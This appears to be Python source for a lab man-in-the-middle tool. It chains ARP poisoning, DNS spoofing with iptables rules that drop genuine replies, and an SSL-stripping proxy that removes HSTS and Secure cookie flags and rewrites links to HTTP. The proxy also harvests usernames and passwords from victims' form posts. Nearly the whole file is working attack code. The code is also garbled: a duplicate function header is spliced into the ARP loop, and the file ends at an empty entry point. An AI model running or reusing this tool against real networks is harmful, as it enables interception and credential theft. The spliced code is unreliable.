# =============================================================================
# MITM Attack Tool - Lab on Offensive Cyber Security
# =============================================================================
# This tool performs a Man-in-the-Middle attack combining:
# 1. ARP Poisoning - To intercept traffic between victim and gateway
# 2. DNS Spoofing - To redirect victim's DNS queries to attacker
# 3. SSL Stripping - To downgrade HTTPS connections to HTTP
# =============================================================================

# Scapy library for crafting and sending network packets (ARP, DNS, etc.)
from scapy.all import *
import threading          # For running multiple attack components simultaneously
import time               # For sleep intervals between ARP packets
import os                 # For system commands (iptables, IP forwarding)
import signal             # For handling Ctrl+C gracefully
import sys                # For system exit and command line args
from http.server import HTTPServer, BaseHTTPRequestHandler  # For SSL strip proxy
import urllib.request     # For URL handling
import urllib.parse       # For parsing URLs and POST data
import urllib.error       # For handling URL errors
import ssl                # For creating SSL contexts (HTTPS connections)
import re                 # For regex pattern matching (credentials, HTTPS links)
from collections import defaultdict  # For tracking stripped links
from datetime import datetime  # For timestamps in logs
import argparse           # For parsing command line arguments
import ipaddress          # For IP address validation and network calculations
import socket             # For low-level network operations
import traceback          # For detailed error messages
import dns.resolver       # For resolving real IPs via upstream DNS (bypasses our spoof)
import http.client        # For making HTTP/HTTPS connections to real servers

# =============================================================================
# CONFIGURATION
# =============================================================================
# Global configuration dictionary storing attack parameters
CONFIG = {
    "ATTACKER_IP": None,   # IP address of the attacker machine
    "INTERFACE": None,     # Network interface to use (e.g., wlp0s20f3, eth0)
    "SERVER_IP": None,     # IP address of the server of the attacker
    "VICTIM_IP": None,     # IP address of the target victim
    "MODE": None           # Attack mode: SILENT (targeted) or ALL_OUT (aggressive)
}

# DNS spoofing map: domain -> IP to redirect to (used in SILENT mode)
SPOOF_MAP = {}

# =============================================================================
# GLOBAL VARIABLES FOR NETWORK STATE
# =============================================================================
VICTIM_MAC = None          # MAC address of the victim (discovered via ARP)
GATEWAY_IP = None          # IP address of the network gateway/router
GATEWAY_MAC = None         # MAC address of the gateway (discovered via ARP)
STOP_ATTACK = False        # Flag to signal all threads to stop
UPSTREAM_DNS = "8.8.8.8"   # Google's DNS - used to resolve real IPs for proxy

# =============================================================================
# SSL STRIPPING CONFIGURATION
# =============================================================================
SSL_STRIP_PORT = 8080      # Port where our SSL stripping proxy listens
ssl_strip_server = None    # Reference to the HTTP server instance
http_to_https_map = {}     # Cache: maps HTTP URLs to their HTTPS equivalents
real_ip_cache = {}         # Cache: maps hostnames to their real IP addresses
captured_credentials = []  # List storing all captured username/password pairs

# =============================================================================
# ANALYSIS DATA STRUCTURES
# =============================================================================
# This class tracks and analyzes the effectiveness of SSL stripping
# It monitors HSTS headers, cookies, and HTTP->HTTPS upgrades
class SSLStripAnalyzer:
    def __init__(self):
        self.http_requests = []           # All HTTP requests seen
        self.https_upgrades = []          # HTTP->HTTPS redirects (the "bridge" moment)
        self.hsts_detections = {}         # Sites that sent HSTS headers
        self.cookie_analysis = []         # Cookies and their security attributes
        self.direct_https = []            # Direct HTTPS attempts (HSTS preload)
        self.stripped_links = defaultdict(int)  # Count of HTTPS links stripped
        self.credentials_captured = []    # Credentials found in POST data
        self.attack_effectiveness = {
            'vulnerable_sites': [],       # Sites without HSTS protection
            'hsts_protected': [],         # Sites protected by HSTS
            'preload_protected': [],      # Sites in browser's HSTS preload list
            'secure_cookies': [],         # Sites using Secure cookie flag
        }
    
    # Log an HTTP request - every HTTP request is a potential stripping opportunity
    def log_http_request(self, host, path, method):
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'host': host, 'path': path, 'method': method, 'protocol': 'HTTP'
        }
        self.http_requests.append(entry)
        print(f"[Analyzer] HTTP Request: {method} {host}{path}")
    
    # Log HTTP->HTTPS redirect - this is the critical "t0" moment where stripping works
    # At this moment, the victim requested HTTP and server wants to upgrade to HTTPS
    # Our proxy intercepts this and keeps the victim on HTTP
    def log_https_upgrade(self, from_url, to_url, status_code):
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'from': from_url, 'to': to_url, 'status': status_code,
            'type': 'HTTP→HTTPS Bridge'
        }
        self.https_upgrades.append(entry)
        print(f"\n[Analyzer] CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
        print(f"[Analyzer]   From: {from_url}")
        print(f"[Analyzer]   To: {to_url}")
        print(f"[Analyzer]   Status: {status_code}\n")
    
    # Log HSTS header detection - HSTS tells browsers to always use HTTPS
    # Once a browser sees this header, it will never make HTTP requests to this domain
    def log_hsts(self, domain, hsts_header):
        self.hsts_detections[domain] = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'header': hsts_header,
            'max_age': self._parse_max_age(hsts_header)
        }
        print(f"[Analyzer] HSTS Detected on {domain}")
        if domain not in self.attack_effectiveness['hsts_protected']:
            self.attack_effectiveness['hsts_protected'].append(domain)
    
    # Log cookie security attributes
    # Secure flag: cookie only sent over HTTPS (protects against our attack)
    # HttpOnly flag: cookie not accessible via JavaScript (protects against XSS)
    def log_cookie(self, domain, cookie_name, has_secure, has_httponly):
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'domain': domain, 'name': cookie_name,
            'secure': has_secure, 'httponly': has_httponly
        }
        self.cookie_analysis.append(entry)
        if has_secure and domain not in self.attack_effectiveness['secure_cookies']:
            self.attack_effectiveness['secure_cookies'].append(domain)
    
    # Log direct HTTPS connection attempt (CONNECT method)
    # This happens when browser tries HTTPS directly - likely HSTS preload
    # We cannot strip these - the browser never made an HTTP request
    def log_direct_https(self, host):
        self.direct_https.append({'timestamp': datetime.now().strftime('%H:%M:%S'), 'host': host})
        print(f"[Analyzer] Direct HTTPS: {host} - Likely HSTS Preload")
        if host not in self.attack_effectiveness['preload_protected']:
            self.attack_effectiveness['preload_protected'].append(host)
    
    # Track each HTTPS link we strip from page content
    def log_link_strip(self, url):
        self.stripped_links[url] += 1
    
    # Log captured credentials from POST data
    def log_credentials(self, host, data):
        entry = {'timestamp': datetime.now().strftime('%H:%M:%S'), 'host': host, 'data': data[:500]}
        self.credentials_captured.append(entry)
    
    # Extract max-age value from HSTS header
    # max-age determines how long browser remembers to use HTTPS
    def _parse_max_age(self, hsts_header):
        match = re.search(r'max-age=(\d+)', hsts_header)
        return int(match.group(1)) if match else 0
    
    # Generate comprehensive report at the end of the attack
    def generate_report(self):
        print("\n" + "="*80)
        print("                 SSL STRIPPING FEASIBILITY ANALYSIS REPORT")
        print("="*80)
        
        print(f"\n TRAFFIC SUMMARY:")
        print(f"   • Total HTTP requests: {len(self.http_requests)}")
        print(f"   • HTTP→HTTPS upgrades detected: {len(self.https_upgrades)}")
        print(f"   • Direct HTTPS attempts: {len(self.direct_https)}")
        print(f"   • HTTPS links stripped: {sum(self.stripped_links.values())}")
        
        # Show the "bridge" moments - where SSL stripping could intercept
        print(f"\n CRITICAL 'BRIDGE' MOMENTS (t0 - where attack could work):")
        if self.https_upgrades:
            for upgrade in self.https_upgrades:
                print(f"   • {upgrade['timestamp']}: {upgrade['from']} → {upgrade['to']}")
        else:
            print(f"   • None detected")
        
        print(f"\n HSTS PROTECTION ANALYSIS:")
        if self.hsts_detections:
            for domain, data in self.hsts_detections.items():
                print(f"   • {domain}: Max-Age={data['max_age']/86400:.1f} days")
        else:
            print(f"   • No HSTS headers detected")
        
        print(f"\n CAPTURED CREDENTIALS:")
        if captured_credentials:
            for cred in captured_credentials:
                print(f"   • {cred['timestamp']} - {cred['host']}")
                print(f"     Username: {cred.get('username', 'N/A')}")
                print(f"     Password: {cred.get('password', 'N/A')}")
        else:
            print(f"   • No credentials captured")
        
        print(f"\n ATTACK EFFECTIVENESS:")
        print(f"   • HSTS-protected sites: {len(self.attack_effectiveness['hsts_protected'])}")
        print(f"   • Preload-protected sites: {len(self.attack_effectiveness['preload_protected'])}")
        print("\n" + "="*80 + "\n")

# Create global analyzer instance
analyzer = SSLStripAnalyzer()

# =============================================================================
# DNS RESOLUTION FOR PROXY
# =============================================================================
# This function resolves the REAL IP of a hostname using upstream DNS (8.8.8.8)
# This is critical because our DNS spoof redirects all queries to attacker
# But the proxy needs to know the real IP to fetch actual content
def resolve_real_ip(hostname):
    global real_ip_cache
    
    # Check cache first to avoid repeated DNS lookups
    if hostname in real_ip_cache:
        return real_ip_cache[hostname]
    
    # Check if hostname is already an IP address (e.g., 192.168.1.1)
    # If so, no DNS resolution needed - return it directly
    try:
        ipaddress.ip_address(hostname)
        print(f"[SSL Strip] {hostname} is already an IP address")
        real_ip_cache[hostname] = hostname
        return hostname
    except ValueError:
        pass  # Not an IP address, continue with DNS resolution
    
    # Skip invalid or local hostnames
    if '.' not in hostname or hostname in ['localhost', 'wpad', 'wpad.home']:
        return None
    
    try:
        # Create DNS resolver that queries upstream DNS directly
        # This bypasses our own DNS spoof so we get the real IP
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [UPSTREAM_DNS]  # Use Google DNS
        resolver.timeout = 5
        resolver.lifetime = 5
        
        # Resolve the A record (IPv4 address)
        answers = resolver.resolve(hostname, 'A')
        if answers:
            real_ip = str(answers[0])
            real_ip_cache[hostname] = real_ip
            print(f"[SSL Strip] Resolved {hostname} -> {real_ip}")
            return real_ip
    except dns.resolver.NXDOMAIN:
        # Domain doesn't exist - might be a fake domain for phishing
        print(f"[SSL Strip] Domain {hostname} not found - using local server")
    except Exception as e:
        print(f"[SSL Strip] DNS error for {hostname}: {e}")
    return None

# =============================================================================
# IPTABLES MANAGEMENT
# =============================================================================
# This function manages iptables rules for DNS response dropping
# We need to drop legitimate DNS responses from the gateway so our
# spoofed responses arrive first and are accepted by the victim
def manage_iptables(action):
    if action not in ['A', 'D']:  # A = Add rule, D = Delete rule
        return
    # Rule: Drop UDP packets from gateway (DNS server) on port 53 to victim
    # This ensures our spoofed DNS response wins the race
    cmd = f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 -d {CONFIG['VICTIM_IP']} -j DROP"
    print(f"[{action}] IPTables: {cmd}")
    os.system(cmd)

# =============================================================================
# ARP FUNCTIONS
# =============================================================================
# Find the gateway IP by checking the routing table
# Routes packets to a random external IP and sees which gateway is used
def find_gateway():
    return conf.route.route("123.123.123.000")[2]

# Find MAC address of a given IP using ARP request
# Sends broadcast ARP "who-has" and waits for reply
def find_mac(target_IP):
    # Create ARP request packet: broadcast Ethernet + ARP query
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_IP)
    # Send packet and wait for response (srp = send/receive at layer 2)
    answered, _ = srp(arp_request, timeout=2, verbose=False)
    for sent, received in answered:
        if received.psrc == target_IP:
            return received.hwsrc  # Return the MAC address
    return None

# Restore legitimate ARP entries after attack ends
# Sends correct ARP replies to both victim and gateway
def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    # Tell victim: gateway's IP is at gateway's real MAC
    victim_restore = Ether(src=gateway_mac, dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac)
    # Tell gateway: victim's IP is at victim's real MAC
    gateway_restore = Ether(src=victim_mac, dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
    # Send multiple times to ensure it sticks
    sendp(victim_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
    sendp(gateway_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
    print("[ARP Poison] ARP tables restored.")

# Main ARP poisoning loop - runs continuously in a thread
# Sends forged ARP replies to maintain our position in the middle
def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
    # Packet to victim: "I am the gateway" (attacker's MAC, gateway's IP)
    victim_packet = Ether(dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
    # Packet to gateway: "I am the victim" (attacker's MAC, victim's IP)
    gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
    
    # SILENT mode: slower (4s) to avoid detection
    # ALL_OUT mode: faster (0.5s) to ensure poison stickstim
def manage_iptables(action):
    if action not in ['A', 'D']:  # A = Add rule, D = Delete rule
        return
    sleep_interval = 4 if CONFIG["MODE"] == "SILENT" else 0.5
    global STOP_ATTACK
    
    # Keep sending until attack is stopped
    while not STOP_ATTACK:
        try:
            sendp(victim_packet, iface=CONFIG["INTERFACE"], verbose=False)
            sendp(gateway_packet, iface=CONFIG["INTERFACE"], verbose=False)
            time.sleep(sleep_interval)
        except:
            break

# =============================================================================
# DNS FUNCTIONS
# =============================================================================
# Handler for sniffed DNS packets - decides whether to spoof each query
def dns_handler(packet):
    global STOP_ATTACK
    
    # Ignore if attack stopped, not DNS, not a query, or from ourselves
    if STOP_ATTACK or not packet.haslayer(DNS) or packet[DNS].qr != 0 or not packet.haslayer(DNSQR):
        return
    if packet[IP].src == CONFIG["ATTACKER_IP"]:
        return  # Don't spoof our own queries
    
    try:
        query_name = packet[DNSQR].qname.decode('utf-8')
    except:
        return
    
    print(f"[DNS Spoof] Query: '{query_name}' from {packet[IP].src}")
    
    # Decide whether to spoof based on mode
    should_spoof = False
    spoof_ip = None
    
    if CONFIG["MODE"] == "ALL_OUT" and packet[DNSQR].qtype == 1:
        # ALL_OUT: Spoof ALL A record queries, redirect to attacker server
        should_spoof = True
        spoof_ip = CONFIG["SERVER_IP"]
    elif CONFIG["MODE"] == "SILENT" and query_name in SPOOF_MAP:
        # SILENT: Only spoof domains in our target list
        should_spoof = True
        spoof_ip = SPOOF_MAP[query_name]
    
    # Only spoof queries from the victim
    if should_spoof and packet[IP].src == str(CONFIG["VICTIM_IP"]):
        print(f"[DNS Spoof] SPOOFING: {query_name} -> {spoof_ip}")
        
        # Craft spoofed DNS response
        # IP layer: swap source/destination (response goes back to victim)
        spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src)
        # UDP layer: swap ports
        spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
        # DNS answer: the domain resolves to our attacker IP
        spoofed_answer = DNSRR(rrname=query_name, rdata=spoof_ip)
        # DNS response: must use same transaction ID as query
        spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer)
        
        # Send the forged response
        send(spoofed_ip/spoofed_udp/spoofed_dns, verbose=0)

# Callback to check if sniffing should stop
def stop_sniffing(packet):
    return STOP_ATTACK

# Start DNS spoofing in a separate thread
def start_dns_spoofing():
    print(f"[DNS Spoof] Starting on {CONFIG['INTERFACE']}")
    
    def sniff_dns():
        try:
            # Sniff DNS packets to/from victim
            sniff(iface=CONFIG["INTERFACE"], filter=f"udp and port 53 and host {CONFIG['VICTIM_IP']}",
                  prn=dns_handler, store=0, stop_filter=stop_sniffing)
        except:
            pass
    
    thread = threading.Thread(target=sniff_dns)
    thread.daemon = True
    return thread

# =============================================================================
# SSL STRIPPING - Connection Classes
# =============================================================================
# Custom HTTP connection that connects to a specific IP but sends original Host header
# This is needed because we resolve the real IP ourselves (bypassing DNS)
# but the server needs the correct Host header for virtual hosting
class DirectIPHTTPConnection(http.client.HTTPConnection):
    def __init__(self, real_ip, host, port=80, timeout=15):
        # Connect to the real IP, not the hostname
        super().__init__(real_ip, port, timeout=timeout)
        self._real_host = host  # Store original hostname for Host header
    
    def putheader(self, header, *values):
        # Override Host header with original hostname
        if header.lower() == 'host':
            values = (self._real_host,)
        super().putheader(header, *values)

# Same as above but for HTTPS connections
class DirectIPHTTPSConnection(http.client.HTTPSConnection):
    def __init__(self, real_ip, host, port=443, timeout=15, context=None):
        super().__init__(real_ip, port, timeout=timeout, context=context)
        self._real_host = host
    
    def putheader(self, header, *values):
        if header.lower() == 'host':
            values = (self._real_host,)
        super().putheader(header, *values)

# =============================================================================
# SSL STRIPPING - Main Handler
# =============================================================================
# This is the core of SSL stripping - an HTTP proxy that:
# 1. Receives HTTP requests from victim (redirected via iptables)
# 2. Fetches content from real server (following HTTPS redirects)
# 3. Returns content to victim over HTTP (stripping HTTPS)
# 4. Rewrites all HTTPS links in content to HTTP
class SSLStripHandler(BaseHTTPRequestHandler):
    
    # Suppress default HTTP server logging
    def log_message(self, format, *args):
        pass
    
    # Handle GET requests
    def do_GET(self):
        self.handle_request('GET')
    
    # Handle POST requests (important for capturing credentials)
    def do_POST(self):
        self.handle_request('POST')
    
    # Handle HEAD requests
    def do_HEAD(self):
        self.handle_request('HEAD')
    
    # Handle CONNECT requests (direct HTTPS attempts)
    # This means browser is trying to establish HTTPS tunnel
    # We cannot strip this - browser never made HTTP request
    def do_CONNECT(self):
        host = self.path.split(':')[0]
        analyzer.log_direct_https(host)
        print(f"[SSL Strip] CONNECT {host} - HSTS protected")
        self.send_error(502, "HSTS protected")
    
    # Main request handler for GET, POST, HEAD
    def handle_request(self, method):
        try:
            post_data = None
            
            # Read POST body if present
            if method == 'POST':
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length)
                    # Check for credentials in POST data
                    self.log_credentials(post_data, self.headers.get('Host', 'unknown'))
            
            # Extract host and path from request
            host = self.headers.get('Host', '')
            path = self.path
            
            # Handle absolute URLs in path (proxy-style requests)
            if path.startswith('http://') or path.startswith('https://'):
                parsed = urllib.parse.urlparse(path)
                host = parsed.netloc
                path = parsed.path or '/'
                if parsed.query:
                    path += '?' + parsed.query
            
            # Validate host
            if not host or '.' not in host or host in ['wpad', 'localhost']:
                self.send_error(404, "Not Found")
                return
            
            if not path.startswith('/'):
                path = '/' + path
            
            original_url = f"http://{host}{path}"
            analyzer.log_http_request(host, path, method)
            print(f"[SSL Strip] {method} {original_url}")
            
            # Check if we've seen this URL redirect to HTTPS before
            target_url = http_to_https_map.get(original_url, original_url)
            
            # Fetch content from real server
            response_data, response_headers, status_code, final_url = self.fetch_url(
                target_url, method, host, post_data
            )
            
            if response_data is None:
                self.send_error(502, "Failed to fetch")
                return
            
            # Log if we detected HTTP->HTTPS upgrade (the "bridge")
            if final_url and final_url.startswith('https://') and not target_url.startswith('https://'):
                analyzer.log_https_upgrade(original_url, final_url, status_code)
                http_to_https_map[original_url] = final_url
            
            # Analyze response headers for HSTS, cookies, etc.
            self.analyze_response(host, response_headers)
            
            # Get content type to decide if we should strip HTTPS links
            content_type = ''
            for h, v in response_headers:
                if h.lower() == 'content-type':
                    content_type = v.lower()
                    break
            
            # Strip HTTPS references from HTML, CSS, JavaScript
            if any(ct in content_type for ct in ['text/html', 'text/css', 'javascript']):
                response_data = self.strip_https_references(response_data, host)
            
            # Send response to victim
            self.send_response(200)
            
            # Headers to skip (would break our attack or cause issues)
            skip = {'transfer-encoding', 'content-encoding', 'content-length',
                   'strict-transport-security', 'content-security-policy', 'connection'}
            
            for h, v in response_headers:
                if h.lower() not in skip:
                    # Strip Secure flag from cookies so they're sent over HTTP
                    if h.lower() == 'set-cookie':
                        v = self.strip_cookie_security(v)
                    self.send_header(h, v)
            
            self.send_header('Content-Length', len(response_data))
            self.end_headers()
            
            if method != 'HEAD':
                self.wfile.write(response_data)
            
            print(f"[SSL Strip] Sent {len(response_data)} bytes")
            
        except Exception as e:
            print(f"[SSL Strip] Error: {e}")
            try:
                self.send_error(502, "Error")
            except:
                pass
    
    # Fetch URL from real server, following redirects
    # Handles both HTTP and HTTPS, converts HTTPS responses to HTTP for victim
    def fetch_url(self, url, method, original_host, post_data=None):
        max_redirects = 10
        current_url = url
        final_url = url
        
        for _ in range(max_redirects):
            parsed = urllib.parse.urlparse(current_url)
            is_https = parsed.scheme == 'https'
            hostname = parsed.netloc.split(':')[0]
            port = parsed.port or (443 if is_https else 80)
            path = parsed.path or '/'
            if parsed.query:
                path += '?' + parsed.query
            
            # Resolve real IP (bypasses our DNS spoof)
            real_ip = resolve_real_ip(hostname)
            if not real_ip:
                # DNS resolution failed - probably a fake domain
                # Forward to local phishing server instead
                real_ip = CONFIG['ATTACKER_IP']
                port = 80
                print(f"[SSL Strip] -> Local server {real_ip}:{port}")
            
            try:
                # Create connection based on protocol
                if is_https:
                    # For HTTPS, disable certificate verification
                    # (we're MITMing, server cert won't match)
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    conn = DirectIPHTTPSConnection(real_ip, hostname, port, timeout=30, context=ctx)
                else:
                    conn = DirectIPHTTPConnection(real_ip, hostname, port, timeout=30)
                
                # Copy headers from original request (except problematic ones)
                headers = {h: v for h, v in self.headers.items() 
                          if h.lower() not in ['host', 'connection', 'accept-encoding']}
                headers['Host'] = hostname
                
                # Make the request
                conn.request(method, path, body=post_data if method == 'POST' else None, headers=headers)
                response = conn.getresponse()
                
                # Handle redirects (301, 302, 303, 307, 308)
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.getheader('Location', '')
                    if location:
                        # Handle relative redirects
                        if location.startswith('/'):
                            location = f"{parsed.scheme}://{hostname}{location}"
                        elif not location.startswith('http'):
                            location = urllib.parse.urljoin(current_url, location)
                        
                        print(f"[SSL Strip] Redirect -> {location}")
                        
                        # Track HTTP->HTTPS upgrade
                        if location.startswith('https://') and current_url.startswith('http://'):
                            final_url = location
                        
                        current_url = location
                        
                        # 301/302/303 redirects change POST to GET
                        if response.status in [301, 302, 303]:
                            method = 'GET'
                            post_data = None
                        
                        conn.close()
                        continue
                
                # Read response body and return
                data = response.read()
                conn.close()
                return data, list(response.getheaders()), response.status, final_url
                
            except Exception as e:
                print(f"[SSL Strip] Fetch error: {e}")
                return None, [], 0, None
        
        return None, [], 0, None
    
    # Strip all HTTPS references from content, replacing with HTTP
    # This prevents the browser from making direct HTTPS requests
    def strip_https_references(self, data, host):
        try:
            text = data.decode('utf-8', errors='ignore')
            
            # Find all HTTPS URLs and cache them for future requests
            for url in set(re.findall(r'https://[^\s<>"\'\\]+', text)):
                url_clean = re.sub(r'[),;]+$', '', url)
                http_to_https_map[url_clean.replace('https://', 'http://', 1)] = url_clean
                analyzer.log_link_strip(url_clean)
            
            # Replace all https:// with http://
            count = text.count('https://')
            text = text.replace('https://', 'http://')
            # Also handle JSON-escaped URLs
            text = text.replace('https:\\/\\/', 'http:\\/\\/')
            
            if count > text.count('https://'):
                print(f"[SSL Strip] Stripped {count - text.count('https://')} HTTPS refs")
            
            return text.encode('utf-8')
        except:
            return data
    
    # Remove Secure flag from cookies so they're sent over HTTP
    def strip_cookie_security(self, value):
        return re.sub(r';\s*[Ss]ecure\b', '', value)
    
    # Analyze response headers for security features
    def analyze_response(self, host, headers):
        for h, v in headers:
            if h.lower() == 'strict-transport-security':
                analyzer.log_hsts(host, v)
            elif h.lower() == 'set-cookie':
                name = v.split('=')[0].strip()
                analyzer.log_cookie(host, name, 'secure' in v.lower(), 'httponly' in v.lower())
    
    # Check POST data for credentials (username, password, etc.)
    def log_credentials(self, post_data, host):
        try:
            data_str = post_data.decode('utf-8', errors='ignore')
            
            # Patterns that indicate credential fields
            patterns = ['password', 'passwd', 'pass', 'pwd', 'user', 'username', 'email', 'login']
            found = [p for p in patterns if p in data_str.lower()]
            
            if found:
                # Parse POST data to extract username and password
                params = urllib.parse.parse_qs(data_str)
                username = params.get('username', params.get('user', params.get('email', [''])))[0]
                password = params.get('password', params.get('pass', params.get('pwd', [''])))[0]
                
                # Display captured credentials prominently
                print(f"CREDENTIALS INTERCEPTED")
                print(f"    Host: {host}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                print(f"    Time: {datetime.now().strftime('%H:%M:%S')}")
                print(f"    Victim: {self.client_address[0]}")
                
                # Store for final report
                captured_credentials.append({
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'host': host, 'username': username, 'password': password,
                    'victim_ip': self.client_address[0]
                })
        except Exception as e:
            print(f"[SSL Strip] Credential log error: {e}")

# =============================================================================
# SSL STRIPPING - Server Functions
# =============================================================================
# Start the SSL stripping proxy server
def start_ssl_strip():
    global ssl_strip_server
    print(f"[SSL Strip] Starting proxy on port {SSL_STRIP_PORT}")
    try:
        # Allow port reuse to avoid "address already in use" errors
        class ReusableTCPServer(HTTPServer):
            allow_reuse_address = True
        
        # Create server listening on all interfaces
        ssl_strip_server = ReusableTCPServer(('0.0.0.0', SSL_STRIP_PORT), SSLStripHandler)
        
        # Run in separate thread
        thread = threading.Thread(target=ssl_strip_server.serve_forever)
        thread.daemon = True
        thread.start()
        return thread
    except Exception as e:
        print(f"[SSL Strip] Failed: {e}")
        return None

# Set up iptables to redirect victim's HTTP traffic to our proxy
def setup_ssl_strip_iptables():
    # Redirect victim's port traffic to our proxy on port 8080
    cmd = f"sudo iptables -t nat -A PREROUTING -i {CONFIG['INTERFACE']} -p tcp -s {CONFIG['VICTIM_IP']} --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
    print(f"[SSL Strip] iptables redirect port 80 -> {SSL_STRIP_PORT}")
    os.system(cmd)

# Remove iptables rule
def cleanup_ssl_strip_iptables():
    cmd = f"sudo iptables -t nat -D PREROUTING -i {CONFIG['INTERFACE']} -p tcp -s {CONFIG['VICTIM_IP']} --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
    os.system(cmd + " 2>/dev/null")

# Stop the SSL stripping proxy and generate report
def stop_ssl_strip():
    global ssl_strip_server
    if ssl_strip_server:
        print("[SSL Strip] Shutting down...")
        ssl_strip_server.shutdown()
        ssl_strip_server = None
    analyzer.generate_report()

# =============================================================================
# MAIN
# =============================================================================
# Main setup function - parses arguments and starts all attack components
def setup_and_run():
    global CONFIG, SPOOF_MAP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(prog="MITM Attack Tool")
    parser.add_argument("--interface", default=conf.iface)
    parser.add_argument("--mode", choices=["SILENT", "ALL_OUT"], required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--server", default=None)
    args = parser.parse_args()
    
    # Get attacker's IP address from interface
    CONFIG['INTERFACE'] = args.interface
    try:
        CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])
    except:
        print(f"[!] Cannot get IP for {args.interface}")
        sys.exit(1)

    if args.server is None:
        CONFIG['SERVER_IP'] = CONFIG['ATTACKER_IP']
    else:
        CONFIG['SERVER_IP'] = args.server
    
    # Set attack mode
    CONFIG['MODE'] = args.mode
    
    # SILENT mode: ask for specific domain to spoof
    if args.mode == "SILENT":
        print("[SETUP] Enter website to spoof (e.g., 'example.com.'):")
        website = input("[SETUP] Website: ").strip()
        if not website.endswith('.'):
            website += '.'
        SPOOF_MAP[website] = CONFIG['SERVER_IP']
        print(f"[SETUP] {website} -> {CONFIG['SERVER_IP']}")
    
    # Find gateway and validate target IP
    GATEWAY_IP = find_gateway()
    network = ipaddress.ip_network(f"{CONFIG['ATTACKER_IP']}/24", strict=False)
    
    try:
        ip = ipaddress.ip_address(args.target)
        if ip in network and str(ip) != GATEWAY_IP:
            CONFIG['VICTIM_IP'] = str(ip)
        else:
            print("[!] Invalid target")
            sys.exit(1)
    except:
        print("[!] Invalid IP")
        sys.exit(1)
    
    # Display attack configuration
    print("\n" + "="*60)
    print("    MITM Attack Tool - Offensive Cyber Security Lab")
    print("="*60)
    print(f"[*] Mode: {CONFIG['MODE']}")
    print(f"[*] Attacker: {CONFIG['ATTACKER_IP']}")
    print(f"[*] Victim: {CONFIG['VICTIM_IP']}")
    print(f"[*] Interface: {CONFIG['INTERFACE']}")
    
    # Discover MAC addresses via ARP
    GATEWAY_MAC = find_mac(GATEWAY_IP)
    VICTIM_MAC = find_mac(CONFIG["VICTIM_IP"])
    
    if not GATEWAY_MAC or not VICTIM_MAC:
        print("[!] Cannot find MAC addresses")
        sys.exit(1)
    
    print(f"[*] Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
    print(f"[*] Victim: {CONFIG['VICTIM_IP']} ({VICTIM_MAC})")
    
    # Enable IP forwarding so packets flow through us
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding enabled")
    
    # Add iptables rule to drop legitimate DNS responses
    manage_iptables('A')
    
    # Start ARP poisoning thread
    arp_thread = threading.Thread(target=arp_poison_loop, args=(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
    arp_thread.daemon = True
    arp_thread.start()
    print("[ARP] Poisoning started")
    
    # Start DNS spoofing thread
    dns_thread = start_dns_spoofing()
    dns_thread.start()
    print("[DNS] Spoofing started")
    
    # Start SSL stripping proxy (only if server is local)
    if CONFIG['SERVER_IP'] == CONFIG['ATTACKER_IP']:
        # Local server - use SSL strip proxy
        setup_ssl_strip_iptables()
        ssl_thread = start_ssl_strip()
        print("[SSL] Stripping proxy started")
    else:
        # External server - just DNS spoof, no local proxy needed
        ssl_thread = None
        print(f"[*] External server mode: DNS spoofs to {CONFIG['SERVER_IP']}")
        print(f"[*] SSL stripping disabled (traffic goes directly to external server)")
    
    print("\n" + "="*60)
    print("    Attack running. Ctrl+C to stop.")
    
    
    return arp_thread, dns_thread, ssl_thread

# Cleanup function - restore network state and stop all components
def cleanup():
    global STOP_ATTACK
    if STOP_ATTACK:
        return
    
    print("\n[!] Shutting down...")
    STOP_ATTACK = True
    time.sleep(2)  # Give threads time to stop
    
    # Stop SSL stripping and show report
    stop_ssl_strip()
    cleanup_ssl_strip_iptables()
    
    # Restore ARP tables to original state
    if GATEWAY_IP and VICTIM_MAC and GATEWAY_MAC:
        restore_arp(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
    
    # Remove DNS dropping rule
    manage_iptables('D')
    
    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Cleanup complete")
    os._exit(0)

# =============================================================================
# ENTRY POINT
# =============================================================================
if __name__ == "__main__":
